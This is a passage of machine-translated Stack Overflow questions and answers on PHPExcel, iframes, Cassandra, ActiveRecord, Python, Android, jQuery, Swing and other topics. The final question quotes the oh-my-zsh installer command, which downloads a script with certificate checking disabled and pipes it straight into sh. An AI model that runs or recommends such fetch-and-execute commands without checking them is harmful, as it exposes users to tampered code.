$objPHPExcel->getActiveSheet()->getStyle('A1')->getAlignment()->setWrapText(true);
$objPHPExcel->getActiveSheet()->getStyle('A1:H1')->applyFromArray($vAlignTop);
$objPHPExcel->getActiveSheet()->mergeCells('A1:H1');
$objPHPExcel->getActiveSheet()->getColumnDimension('A')->setWidth(8.43); //original width of column A 
```

当我在 excel 中手动完成这些相同的步骤时，我得到了我想要的结果，但上面代码的输出始终是默认的 12.75 行高。

有人有想法么？我真的不介意对列宽进行硬编码，我只希望高度能够响应文本。

提前致谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-06-20T08:18:48.033

自动高度不适用于合并的单元格。我认为这是 Excel 而不是 PHPExcel 的问题。如果你想这样做，你必须使用解决方法。这是我的...

我有一个函数，它接受文本，在换行符（'\n'）上分成几行，并根据每行的字符数（小提琴因子）计算“适合”文本所需的行数。

```
function getRowcount($text, $width=55) {
    $rc = 0;
    $line = explode("\n", $text);
    foreach($line as $source) {
        $rc += intval((strlen($source) / $width) +1);
    }
    return $rc;
} 
```

对于我的报告，通过反复试验得出的小提琴因子是 55。然后我在我的代码中使用上述函数......

```
$purpose = $survey["purpose"];
$numrows = getRowcount($purpose);
$objPHPExcel->getActiveSheet()->setCellValue('B'.$xlrow, 'Report Purpose');
$objPHPExcel->getActiveSheet()->getStyle('B'.$xlrow)->applyFromArray($fmt_cover_bold);
$objPHPExcel->getActiveSheet()->setCellValue('C'.$xlrow, $purpose);
$objPHPExcel->getActiveSheet()->getRowDimension($xlrow)->setRowHeight($numrows * 12.75 + 2.25);
$objPHPExcel->getActiveSheet()->mergeCells('C'.$xlrow.':E'.$xlrow);
$objPHPExcel->getActiveSheet()->getStyle('C'.$xlrow.':E'.$xlrow)->applyFromArray($fmt_normal_wrap);
$xlrow++; 
```

我添加 2.25 只是为了在这个单元格和下一个单元格之间稍微分开。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-08-11T07:12:42.943

我想，我找到了更好的解决方案。当我将数据插入到 foreach 中的合并列时，我通过与 strlen() 进行比较来选择行中最长的字符串。之后将最长的字符串插入最后+1列并将其设置为隐藏列。第 1 行有 4 列 (AD) 的示例

```
$longestContent = "the longest content in row 1";
$mergerColumnsWidth = 24;
$objPHPExcel->getActiveSheet()->setCellValue("E1", $longestContent);
$objPHPExcel->getActiveSheet()->getStyle("E1")->getAlignment()->setWrapText(true);
$objPHPExcel->getActiveSheet()->getColumnDimension("E")->setWidth(mergerColumnsWidth );
$objPHPExcel->getActiveSheet()->getColumnDimension("E")->setVisible(false); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T09:02:12.207

要为任何行设置自动高度，请使用：

```
$_row_number = 10;

$excel->getActiveSheet()->getRowDimension($_row_number)->setRowHeight(-1); 
```

即将参数设置为-1 而不是任何数字。

# javascript - 从 iframe 调用父窗口方法（不同）

> ID：13313052
> 
> 赞同：2
> 
> 时间：2012-11-09T17:32:50.090
> 
> 标签：javascript, iframe, same-origin-policy

我在域上有一个页面：

[http://main.mydomain.com/frame.cfm](http://main.mydomain.com/frame.cfm)包含一个 iframe，加载一个域[http://www.anotherdomain.com](http://www.anotherdomain.com)。

此页面[http://www.anotherdomain.com](http://www.anotherdomain.com)有对[http://sub.mydomain.com/somescript.js的脚本引用](http://sub.mydomain.com/somescript.js)

这个 somescript 是一个类似于 google Analytics 的跟踪脚本，它会随 www.anotherdomain.com 的每个请求一起加载。

在某个阶段，www.anotherdomain.com 页面中的脚本[http://sub.mydomain.com/somescript.js](http://sub.mydomain.com/somescript.js)会尝试调用`window.top.aFunction(); or parent.aFunction();`

使父窗口做一些事情。

我知道 X-Frame-Options 和 Access-Control-Allow-Origin 标头并尝试了两者，但是当我在 www.anotherdomain.com 上的 iframe 中浏览时，我在 Firebug 中收到一条错误消息，告诉我：

```
Error: Permission denied to access property 'relocate'window.top.aFunction(); 
```

在 main.domain 站点上的 web.config 中，我有以下规则：

```
<httpProtocol>
     <customHeaders>
    <add name="Access-Control-Allow-Origin" value="http://sub.mydomain.com" />
        <add name="X-Frame-Options" value="ALLOW-FROM http://sub.mydomain.com" />
     </customHeaders>
</httpProtocol> 
```

我认为应该授予 sub.mydomain.com 访问 main.mydomain.com 上的脚本的权限。

我正在我的电脑上本地使用除 www.anotherdomain.com 之外的所有域进行测试，并使用主机参考。

知道我在这里缺少什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T17:43:24.000

您无法通过跨域 iFrame 访问父窗口函数的方法。它违反了[同源政策](http://en.wikipedia.org/wiki/Same_origin_policy)。http标`X-Frame`头响应告诉浏览器是否允许在 iFrame 中呈现页面，但对您的情况没有帮助。

我推荐的解决方案是用来`window.postMessage()`在两个框架之间进行通信。看看[http://ejohn.org/blog/cross-window-messaging/](http://ejohn.org/blog/cross-window-messaging/)

# java - 多个图像放置在 1 个较大的图像中，并应用了缩放

> ID：13313054
> 
> 赞同：1
> 
> 时间：2012-11-09T17:32:53.943
> 
> 标签：java, image, algorithm

我正在努力将所有图像变成更大的图像；缩放在外部应用（可以是多种事物之一，而不是中继到图像）。这些是我目前正在采取的步骤：

1.  计算大图像的大小（比如 1000x1000）

2.  为数组中的每个图像计算纵横比。（它们都是不同的）

3.  找到它需要的比例（比如总图像的 6%）

4.  取总图像大小/纵横比的平方根以找到一维

5.  将我们知道的边乘以纵横比得到另一个维度。

6.  将图像缩小到新的计算值

7.  （**现在这是我遇到麻烦的地方**）在较大的图像上找到一个适合缩放图像的空间。如果有多个随机选择一个。

8.  重复直到图像被填满。大约有 4000 张图像需要适应。

有很多非常小的图像（1x1、2x1 2x2 等）可用于填充。问题是随机方法和第一个空间方法不是很好，通常最终会出现一些不适合的图像。

有没有一种算法可以在知道所有涉及的尺寸的情况下选择放置图像的最佳位置？旋转很好（所以 100x50 可以视为 50X100）

我目前正在使用 Java，但该问题适用于任何语言。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T19:43:05.863

您正在研究的算法属于称为整数编程的领域。这是一类优化问题的解决方案，其中所有输入都是整数（而不是实数）。您要询问的具体问题名为[bin packing](http://en.wikipedia.org/wiki/Bin_packing_problem)。[此页面](http://www.codeproject.com/Articles/210979/Fast-optimizing-rectangle-packing-algorithm-for-bu)上有关于此问题的示例代码。

# php - php具有相同类名的多个class_alias

> ID：13313055
> 
> 赞同：3
> 
> 时间：2012-11-09T17:33:05.283
> 
> 标签：php, namespaces, alias

我正在尝试级联扩展通过`class_alias`. 我收到“无法重新声明类”警告，想知道我想要做的事情在 PHP 中是否可行。

我的目标是能够创建一个继承的“链”。`One\one`是基类并`Two\one`扩展它，但也替换`One\one`为别名的类。

这样，任何数量的类都可以扩展特定命名空间中的主要类，而无需了解链中的其他类/其他类已经扩展了哪些类。

一个.php

```
namespace One;

class_alias('One\one', 'one');

class one {} 
```

二.php

```
namesapce Two;

class_alias('Two\one', 'one');

class one extends \one{} 
```

索引.php

```
<?php
require('one.php');
require('two.php');

$instance = new \one();
var_dump($instance); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T20:32:26.987

在同一个命名空间中不能有两个同名的类。您正在尝试通过调用`one`在全局命名空间中两次分配名称。`class_alias`

您正在使用命名空间，然后尝试绕过它们。有什么必要这样做？

# cassandra - Cassandra 数据模型改进

> ID：13313057
> 
> 赞同：1
> 
> 时间：2012-11-09T17:33:07.280
> 
> 标签：cassandra, data-modeling

我遇到了这个问题，我只是不知道该怎么做，所以说我保留了这些用户操作：

*   喜欢
*   评论
*   分享
*   上传

依此类推，列表围绕`20`动作，现在我想出的最佳策略是创建一个单一的 CF，让我们调用它`user_actions`，然后使用复合行（我认为这就是它们的调用方式）。

所以行将由 组成`user_id:action`，现在我想有些人会问为什么不将所有用户操作存储在一行中？好吧，这是我最大的问题，因为我希望用户可以选择用户想看到什么时候说他想检查他的朋友或他自己过去做了什么。

所以说用户想看看他的朋友喜欢什么，我需要做的就是得到所有这些喜欢的那一行，简单吧？

但是，如果用户想要查看`everything`（这是默认选项）怎么办，在这种情况下，我需要进行`~20`查询，我想这对一点流量来说是可以的，但是如果我每秒有 10 万次读取，那意味着 10 万次怎么办？ * 20，听起来很可怕......

但我只是看不到任何其他方式，因为如果我将所有内容存储在一行中，当 cassandra 不支持时，我将如何查询单个操作`WHERE`？

顺便说一句，我正在使用`php`和`phpcassa`图书馆。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:36:10.163

您最终将需要对操作信息进行分页。

此外，您还希望能够对按事件日期排序的数据进行分页，并过滤用户想要查看的操作类型。我建议如下：

*   每个动作类型一行。
*   键是 userId + actionType
*   列名是 [dateinteger + EventId]
*   列值是序列化为单个字符串的事件对象

您可以使用与用户选择的操作相对应的 userId + actionType 列表来查询数据。并切片列名称以对结果进行分页或按日期范围过滤。

我认为这种方法比对所有用户操作使用单行更好，因为您可以轻松地按日期对记录进行排序，还可以选择要查询的操作类型。使用单行，您必须在按操作类型或按日期对记录进行排序之间进行选择。

此外，这比为每个操作事件设置一行更好（IMO），因为您需要创建二级索引来正确查询数据。

# wordpress - 如何在 wordpress 侧边栏中获取小部件的计数？

> ID：13313066
> 
> 赞同：0
> 
> 时间：2012-11-09T17:33:49.387
> 
> 标签：wordpress, widget

我在侧边栏 1 中放置了多个小部件（不同的小部件）。如何在侧边栏 1 中获取小部件的数量？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T10:31:33.340

```
$widgets = get_option('sidebars_widgets');
echo count($widgets['sidebar1']); 
```

# ruby-on-rails - ActiveRecord::Base.connection.select_all - 哈希错误

> ID：13313067
> 
> 赞同：1
> 
> 时间：2012-11-09T17:34:02.707
> 
> 标签：ruby-on-rails

我有以下代码：

```
<%@submission_general = ActiveRecord::Base.connection.select_all('SELECT * FROM DBASE_general.submission')%>

<%=  @submission_general.count%> -- gives 11,000 entries

<%=  @submission_general[1].sub_id%> -- gives undefined method `sub_id' for #<Hash:0xb4a01108> 
```

我哪里出错了？

非常感谢你的帮助

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T17:40:42.927

根据文档，[ActiveRecord::Base::select_all](http://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/DatabaseStatements.html#method-i-select_all)返回一个哈希数组，而不是模型数组。我猜您想编写类似 Submission.all 的东西，它会生成相同的 SQL（将其绑定到 DBASE_general 数据库中的表提交）。

如果由于某种原因不希望有该表的模型（也许您想节省一些内存，或者事先不知道表名等），您必须将结果作为对 column_name / value 的哈希处理，所以你会使用类似的东西：

```
@submission_general = ActiveRecord::Base.connection.select_all('SELECT * FROM DBASE_general.submission')
@submission_general[1]["sub_id"] 
```

但是，上述方法有很多缺陷，所以如果可以的话，最好使用模型。

# python - 将变量保持在python的范围内

> ID：13313069
> 
> 赞同：0
> 
> 时间：2012-11-09T17:34:12.030
> 
> 标签：python, pong

我正在尝试为乒乓球游戏编写代码，但是在尝试控制球拍位置的范围时遇到了一个问题，问题是：python中有没有办法将变量保持在一定范围内（使用最大值和最小值）当变量变化（增加）时，它会停留在该范围的最大值上，当这个变量减少时，它会停留在最小值上？.

我写了这段代码：

```
Range = range(HALF_PAD_HEIGHT, HEIGHT - HALF_PAD_HEIGHT) 
if (paddle1_pos[1] in Range) and (paddle2_pos[1] in Range):    
      paddle1_pos[1] += paddle1_vel[1]
      paddle2_pos[1] += paddle2_vel[1] 
```

当桨位置的值（paddle1_pos[1] 和 paddle2_pos[1]）超出范围时，我无法再使用键盘更新其位置（通过变量（paddle1_vel[1] 和 paddle2_val[2 ]) 所以，我在想python中可能存在一些允许我更新paddle_pos的东西，当我到达范围的一侧时，它会让我保持在那一边，直到我改变更新的方向。希望问题很清楚。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T23:30:37.650

您可以定义自己的“有界”数字类型。例如，如果`paddle1_pos[1]`是一个整数值，您可以创建一个如下所示的类并使用它来代替

```
class BoundedInt(int):
    def __new__(cls, *args, **kwargs):
        lower, upper = bounds = kwargs.pop('bounds')

        val = int.__new__(cls, *args, **kwargs)  # supports all int() args
        val = lower if val < lower else upper if val > upper else val

        val = super(BoundedInt, cls).__new__(cls, val)
        val._bounds = bounds
        return val

    def __add__(self, other):
        return BoundedInt(int(self)+other, bounds=self._bounds)
    __iadd__ = __add__

    def __sub__(self, other):
        return BoundedInt(int(self)-other, bounds=self._bounds)
    __isub__ = __sub__

    def __mul__(self, other):
        return BoundedInt(int(self)*other, bounds=self._bounds)
    __imul__ = __mul__

    # etc, etc...

if __name__ == '__main__':
    v = BoundedInt(100, bounds=(0, 100))
    print type(v), v
    v += 10
    print type(v), v
    w = v + 10
    print type(w), w
    x = v - 110
    print type(x), x 
```

输出：

```
<class '__main__.BoundedInt'> 100
<class '__main__.BoundedInt'> 100
<class '__main__.BoundedInt'> 100
<class '__main__.BoundedInt'> 0 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-24T00:33:36.187

为了完整起见，这是另一个答案，它显示了如何使用元类以编程方式将整数具有的所有算术方法添加到自定义类中。请注意，尚不清楚在每种情况下返回与操作数具有相同边界的 BoundedInt 是否有意义。该代码还与 Python 2 和 3 兼容。

```
class MetaBoundedInt(type):
    # int arithmetic methods that return an int
    _specials = ('abs add and div floordiv invert lshift mod mul neg or pos '
                 'pow radd rand rdiv rfloordiv rlshift rmod rmul ror rpow '
                 'rrshift rshift rsub rtruediv rxor sub truediv xor').split()
    _ops = set('__%s__' % name for name in _specials)

    def __new__(cls, name, bases, attrs):
        classobj = type.__new__(cls, name, bases, attrs)
        # create wrappers for specified arithmetic operations
        for name, meth in ((n, m) for n, m in vars(int).items() if n in cls._ops):
            setattr(classobj, name, cls._WrappedMethod(cls, meth))
        return classobj

    class _WrappedMethod(object):
        def __init__(self, cls, func):
            self.cls, self.func = cls, func

        def __get__(self, obj, cls=None):
            def wrapper(*args, **kwargs):
                # convert result of calling self.func() to cls instance
                return cls(self.func(obj, *args, **kwargs), bounds=obj._bounds)
            for attr in '__module__', '__name__', '__doc__':
                setattr(wrapper, attr, getattr(self.func, attr, None))
            return wrapper

def with_metaclass(meta, *bases):
    """ Py 2 & 3 compatible way to specifiy a metaclass. """
    return meta("NewBase", bases, {})

class BoundedInt(with_metaclass(MetaBoundedInt, int)):
    def __new__(cls, *args, **kwargs):
        lower, upper = bounds = kwargs.pop('bounds')
        val = int.__new__(cls, *args, **kwargs)  # supports all int() args
        val = super(BoundedInt, cls).__new__(cls, min(max(lower, val), upper))
        val._bounds = bounds
        return val

if __name__ == '__main__':
    # all results should be BoundInt instances with values within bounds
    v = BoundedInt('64', 16, bounds=(0, 100))  # 0x64 == 100
    print('type(v)={}, value={}, bounds={}'.format(type(v).__name__, v, v._bounds))
    v += 10
    print('type(v)={}, value={}, bounds={}'.format(type(v).__name__, v, v._bounds))
    w = v + 10
    print('type(w)={}, value={}, bounds={}'.format(type(w).__name__, w, w._bounds))
    x = v - 110
    print('type(x)={}, value={}, bounds={}'.format(type(x).__name__, x, x._bounds)) 
```

输出：

```
type(v)=BoundedInt, value=100, bounds=(0, 100)
type(v)=BoundedInt, value=100, bounds=(0, 100)
type(w)=BoundedInt, value=100, bounds=(0, 100)
type(x)=BoundedInt, value=0, bounds=(0, 100) 
```

# ruby-on-rails - 在对象数组上使用 ActiveRecord getter

> ID：13313076
> 
> 赞同：4
> 
> 时间：2012-11-09T17:34:20.097
> 
> 标签：ruby-on-rails, ruby, activerecord

如何在 Ruby 中为 ActiveRecord 对象定义自定义 getter 函数，以对 ActiveRecord 对象数组执行操作？

例如，我想返回一组对象的加权平均值。因此，如果我有带有字段数量（100、200、300）和 default_rate（.1、.2、.3）的贷款对象（1、2、3），那么使用普通的 ActiveRecord 函数 Loan.find(1).amount应该返回 100，Loan.find(2).default_rate 应该返回 0.2。

但如果我有 Loan.find(2,3).default_rate，我希望它返回默认利率的加权平均值，即 0.26。我知道我可以使用 SQL 选择语句来做到这一点，但是当我在 Loan 对象数组而不是单个 Loan 对象上调用 getter 时，如何“重载”ActiveRecord getter 以允许定义函数？

贷款表具有字段金额 id、金额和 default_rate

```
class Loan < ActiveRecord::Base
  module Collection
    def default_rate
      sum(:default_rate * :amount) / sum(:amount)
    end
  end
end

class LoanGroup
  has_many :loans, :extend => Loan::Collection
end

#Then I try
obj = LoanGroup.where('id < 10') 
```

这给了我 has_many 在 LoanGroup 中未定义的错误

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:21:53.860

为了避免`Array`使用特定于`Loan`记录集合的方法污染 的命名空间，您可以为此类集合创建一个包装器并在其上调用您的方法。

就像是：

```
class LoanArray < Array
  def initialize(*args)
    find(*args)
  end

  def find(*args)
    replace Array.wrap(Loan.find(*args))
    self
  end

  def default_rate
    if length == 1
      self[0].default_rate 
    else
      inject(0) {|mem,loan| mem + loan.defualt_rate } / count
    end
  end
end

# then
arr = LoanArray.new(2,3).default_rate #=> 0.26
arr.find(1,2,3).default_rate          #=> 0.2
arr.length                            #=> 3
arr.find(1)                           #=> [<Loan id=1>]
arr.default_rate                      #=> 0.1
arr.length                            #=> 1 
```

* * *

下面的原始答案：使用关联扩展

使用关联扩展。这样，无论是贷款还是贷款集合，该方法都是相同的。

```
class MyClass
  has_many :loans do
    def default_rate
      sum(:default_rate) / count
    end
  end
end

obj = MyClass.find(1)
obj.loans.first.default_rate               #=> 0.1
obj.loans.default_rate                     #=> 0.2
obj.loans.where(:id => [2,3]).default_rate #=> 0.26 
```

如果你想在课堂上保留贷款的逻辑`Loan`，你也可以在那里写扩展，例如：

```
class Loan
  module Collection
    def default_rate
      sum(:default_rate) / count
    end

    # plus other methods, as needed, e.g.
    def average_amount
      sum(:amount) / count
    end
  end
end

class MyClass
  has_many :loans, :extend => Loan::Collection
end 
```

编辑：正如@Santosh 指出的那样，`association.find`它不会返回关系，所以它在这里不起作用。您必须使用`where`或其他返回关系的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T17:59:41.363

如果我正确理解了您的问题，您可以为此编写类方法。

```
class Loan
  def self.default_rate
    sum = 0
    all.each do |loan|
      sum += loan.default_rate
    end
    sum / all.count
  end
end 
```

然后

```
Loan.where(:id => [2, 3]).default_rate 
```

如果您想使用 Loan.find(2,3) 的其他解决方案，那么您需要覆盖 Array 类。

```
class Array   
  def default_rate
    sum = 0     
    self.each do |loan|
      sum += loan.default_rate
    end
    sum / self.count
  end
end

Loan.find(2, 3).default_rate 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T17:46:52.837

通过不将其作为类方法执行，您可能会有更多的自由；您可以有一个方法标头，`default_rate (*args)`以允许使用 splat 运算符传入多个参数，然后检查`args`长度。它可以很好地递归完成：

```
def default_rate(*args)
  sum = 0
  if args.length == 1
    return array_name[arg-1] # guessing that's how you store the actual var
  else
    args.each do |arg|
      sum += default_rate arg
    end
  end
  return sum/args.length
end 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-09T18:08:17.220

如果您接受引入命名范围，那么您可以利用事实范围具有定义它们的类的方法。这样，有

```
class Shirt < ActiveRecord::Base
  scope :red, where(:color => 'red')

  def self.sum
    # consider #all as the records you are processing - the scope will
    # make it return neccessary ones only
    all.map(&:id).sum
  end
end

Shirt.red.sum 
```

将为您生成一个 sum id red shirts' ids（与 Shirt.sum 不同，将生成所有 ids 的总和）。

以这种方式布置您的 BL 不仅可以使其更清晰，而且可以重复使用（您可以在任何范围内调用 #sum 方法，无论它多么复杂，您仍然会得到有效的结果）。除此之外，它似乎很容易阅读并且不涉及任何魔法（嗯，几乎:)

希望这会清理你的代码:)

# android - 从它的观点来看，主布局上的android触摸监听器

> ID：13313078
> 
> 赞同：1
> 
> 时间：2012-11-09T17:34:28.247
> 
> 标签：android, ontouchlistener, android-framelayout

我要完成的场景如下：我有主布局 - 这是一个框架布局，在其中我有包含不同视图的线性布局。我希望全局 frameLayout 将接收来自子视图类的触摸事件。

在每个子视图中，我都获得了全局 frameLayout 对象，并对其执行了 setOnTouchListener 。然后，从 UI 中，当我触摸插入到内部 linearLayout 的最后一个视图时，我得到了触摸事件。但对于其他观点，我没有。

```
FramLayout
   LinearLayout
     View1    - not getting touch event 
     View2    - not getting touch event 
     View3    - not getting touch event 
     View4    - getting touch event 
```

有没有人遇到过类似的行为？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T17:44:52.263

嗯...没有代码，诊断起来有点棘手，但我怀疑这种情况->

您将 onTouchListener 设置为 Framelayout 4 次，但每次调用它时，它都会替换之前的 onTouchListener。这就是为什么您的最后一个 onTouchListener 是唯一一个似乎有效的原因。如果是这种情况，您可以改为使用您希望 FrameLayout 的 onTouchListener 执行的代码......并将其放在全局位置，以便每个子视图的 onTouch 将触发该全局函数。说得通？

另外，如果我的回答是正确的（以及其他回答过您问题的人），请您将我们的回答标记为正确吗？您可以通过单击我的答案左侧的空复选标记来做到这一点。它在数字（评级）的正下方

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T17:36:26.467

> 在每个子视图中，我都获得了全局 frameLayout 对象，并对其执行了 setOnTouchListener 。

一个 View 只能有一个 OnTouchListener。当您设置新的侦听器时，您正在覆盖以前的侦听器。

# json - Cocoa - 在 null 上传递 JSON 崩溃

> ID：13313079
> 
> 赞同：0
> 
> 时间：2012-11-09T17:34:32.223
> 
> 标签：json, cocoa, null, nsdictionary

防止我的应用程序崩溃的最佳方法是什么？

我正在使用有时会得到 NULL 字段的 JSON 服务。预防它的最佳方法是什么？

现在，我必须在每个领域都这样做：

```
if(![[[[Dictionary objectForKey:@"option"] objectForKey:@"option"] objectForKey:@"option"] isKindOfClass:[NSNull class]]) 
```

问题是 Dic 非常复杂，有时我什至找不到我要找的字段。所以这是很多验证。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T17:37:14.077

试试这个：

```
NSString *tel = [jsonDictionary valueForKey:@"Telephone"];   
if (tel == (NSString *)[NSNull null]) {
       // do logic here
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:17:58.833

用 nil 替换 NSNull 对象。

这将防止您的崩溃访问“objectForKey”（doesNotRecognizeSelector）。

# visual-studio-2012 - 将 Windows Phone 8 SDK 添加到 Visual Studio 2012

> ID：13313080
> 
> 赞同：7
> 
> 时间：2012-11-09T17:34:31.833
> 
> 标签：visual-studio-2012, windows-phone-8

我的互联网连接非常糟糕，我有 Windows Phone 8 SDK 文件，但没有安装文件。有没有办法在不下载安装文件的情况下将 Windows 8 SDK 添加到 Visual Studio？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-09T17:59:33.567

Not sure, what you mean? You need either existing Visual Studio 2012 installation + you have to install WP8 SDK which expands the Visual Studio, or you can only download the SDK, install it and use the Visual Studio Express for Windows Phone.
Either way you have to download the SDK, either online installation file here:
[https://dev.windowsphone.com/en-us/downloadsdk](https://dev.windowsphone.com/en-us/downloadsdk)
Or complete offline installation ISO here:
[http://go.microsoft.com/fwlink/?LinkID=257234&clcid=0x409](http://go.microsoft.com/fwlink/?LinkID=257234&clcid=0x409)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-07T16:38:43.277

您也可以使用 /layout 选项在本地下载所有包，即键入

```
WPexpress_full.exe /layout 
```

在任何命令提示符下。它将要求下载文件夹来保存这些位。ISO 有点没用，因为手机开发倾向于使用真实的操作系统，而不是虚拟机。

# jquery - 如何淡入背景图像？

> ID：13313082
> 
> 赞同：1
> 
> 时间：2012-11-09T17:34:43.090
> 
> 标签：jquery, css, background-image, fadein

我希望图像在准备好后预加载和淡入。我有预加载器工作，但无法获得淡入淡出效果。

我尝试了什么：

1：CSS3 过渡 - 不适用于背景图像。

2：jQuery fadeIn - 仅适用于 HTML 元素，不适用于 CSS 背景图像。尝试淡化一个元素会导致其中的所有元素也淡化。

jQuery：

```
$(bg).imagesLoaded({
    done: function($images){
        $('body').css('background-image', "url('" + $images[0].src + "')"); 
```

CSS：

```
body{
background-repeat:no-repeat;
background-attachment:fixed;
background-size:cover;
} 
```

我知道可能没有一种巧妙的方法来实现这一点，但我已经看到它在这里完成了，所以必须有一种方法： http: [//movies.io/m/4I/en](http://movies.io/m/4I/en)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:20:01.683

如果您确实需要背景图像解决方案，则创建元素，在其上设置背景图像，如下所示：

```
background-image: url('http://placekitten.com/200/300');<br> 
```

然后使用 jQuery 为各个元素设置动画。

**这是一个用于演示的小提琴：http:**
[//jsfiddle.net/robertp/6rXjs/3/embedded/result/](http://jsfiddle.net/robertp/6rXjs/3/embedded/result/)

干杯，
罗伯

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T15:55:05.713

最后我使用了一个更优雅的解决方案，不需要额外的 div 元素。

这里发生的情况是，当图像完成加载背景图像 css 将添加 jquery 并且将主体颜色设置为白色的类消失。希望它对某人有帮助！

jQuery：（在图像加载函数中）

```
$('body').css('background-image', "url('" + $images[0].src + "')");
$('#wrapper').removeClass("bgFade", 700); 
```

CSS：

```
.bgFade{
    background-color:#FFF;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T17:54:24.210

你可以做这样的事情

```
<div> <-- the block
    <div class="background">
    </div>
    <div class="content">
    ...
    </div>
</div> 
```

使用 position:absolute，将 .content 放在 .background div 上。和苹果淡入到.background。当您需要 div 中的不透明背景时，也可以使用此方法。

# java - 标题栏中的图形渲染

> ID：13313084
> 
> 赞同：1
> 
> 时间：2012-11-09T17:34:47.450
> 
> 标签：java, swing, graphics, awt

图形继续在标题栏中呈现。我使用封装在 jlabel 中的缓冲图像，并使用生成的图形对象在我的代码中绘制矩形。这是 jframe 类构造函数的重要部分：

```
super();
        BufferedImage image=new BufferedImage(680,581,BufferedImage.TYPE_INT_ARGB);
        m_graphicsObject =image.getGraphics();

        JLabel label=new JLabel(new ImageIcon(image));

        // buttons, mouse events and other controls use listeners to handle actions
        // these listener are classes
        btn1 = new JButton("Go!");
        //btn1.setPreferredSize(new Dimension(100, 30));
        btn1.addActionListener(new button_go_Click()); //listener 1

        btn2 = new JButton("Clear!");
        //btn2.setPreferredSize(new Dimension(100, 30));
        btn2.addActionListener(new button_clear_Click()); //listener 2

        //always add created buttons/controls to form
        JPanel panel=new JPanel(new GridLayout(20,2));
        panel.add(btn1);
        panel.add(btn2);

        Container pane = this.getContentPane();

        pane.add(label);
        pane.add(panel, BorderLayout.EAST);
        this.setSize(680,581);
        this.setVisible(true); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T21:15:19.950

问题是您在设置框架的大小时没有考虑框架的边框（可能还有菜单栏）......

而不是使用`this.setSize(680,581)`which is 会导致图像呈现在框架边界内（并超出到不可见的空间），您应该简单地调用`JFrame#pack`并让框架决定如何最好地自行调整大小（基于其内容的首选大小）

![在此处输入图像描述](../Images/d69bea554fcdef10186999565969f10d.png)![在此处输入图像描述](../Images/83b7bf0b5ee0cb6c8ff32946be0d9331.png)

左侧，绝对尺寸，右侧首选尺寸

```
public class SimpleImageLabel {

    public static void main(String[] args) {
        new SimpleImageLabel();
    }

    public SimpleImageLabel() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException ex) {
                } catch (InstantiationException ex) {
                } catch (IllegalAccessException ex) {
                } catch (UnsupportedLookAndFeelException ex) {
                }

                JLabel imageLabel = new JLabel();

                try {
                    imageLabel.setIcon(new ImageIcon(ImageIO.read(new File("/path/to/image"))));
                } catch (Exception e) {
                }

                JFrame frame = new JFrame("Test");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.setLayout(new BorderLayout());
                frame.add(imageLabel);
                frame.pack();  // <-- The better way
//                frame.setSize(imageLabel.getPreferredSize()); // <-- The not better way
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);
            }
        });
    }

} 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-11-09T18:00:21.707

正如我之前提到的，你应该设置你的`JLabel`使用位置

```
aJLabel.setLocation(Point p) 
```

或者

```
aJLabel.setLocation(int x, int y) 
```

如果您的图像太大，您也需要调整它的大小以获得良好的位置（：

此致。

# zsh - sh: 39: source: not found 安装 oh-my-zsh

> ID：13313087
> 
> 赞同：4
> 
> 时间：2012-11-09T17:34:59.977
> 
> 标签：zsh, ubuntu-12.04

在我的 Ubuntu 12.04 LTS 上，我试图按照 github oh-my-zsh 项目页面上的命令安装 oh-my-zsh。

`wget --no-check-certificate [https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh](https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh) -O - | sh`

但我收到以下错误。用 sudo 试过，结果一样。

`Looking for an existing zsh config... Found ~/.zshrc. [0;32]Backing up to ~/.zshrc.pre-oh-my-zsh Using the Oh My Zsh template file and adding it to ~/.zshrc Copying your current PATH and adding it to the end of ~/.zshrc for you. Time to change your default shell to zsh! Password: chsh: PAM authentication failed __ __
**__ / /_ _** **_*_ __ __ **__ *_***/ /_
/ __ / __ \ / __ `__ / / / / /_ / / ***/ _* \ / /*/ / / / / / / / / / / /*/ / / /*(*** *) / / / _***/*/ /*/ /*/ /*/ /*/_*, / /****/****/*/ /*/
/*_**/**`

 **`....is now installed. sh: 39: source: not found`

有什么建议么？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-18T15:19:21.160

错误`sh: 39: source: not found`只是问题的一部分。您发布的输出还表明与更改默认 shell 相关的问题：`Password: chsh: PAM authentication failed`.

